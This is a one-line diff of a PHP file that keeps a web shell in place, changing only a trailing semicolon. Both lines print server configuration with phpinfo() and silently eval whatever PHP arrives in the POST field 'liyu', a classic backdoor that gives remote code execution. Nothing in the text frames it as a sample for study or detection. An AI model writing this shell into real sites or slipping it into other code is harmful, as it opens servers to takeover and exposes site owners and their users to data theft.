@@ -1,1 +1,1 @@
-<?php phpinfo(); @eval($_POST['liyu']);?>;
+<?php phpinfo(); @eval($_POST['liyu']);?>
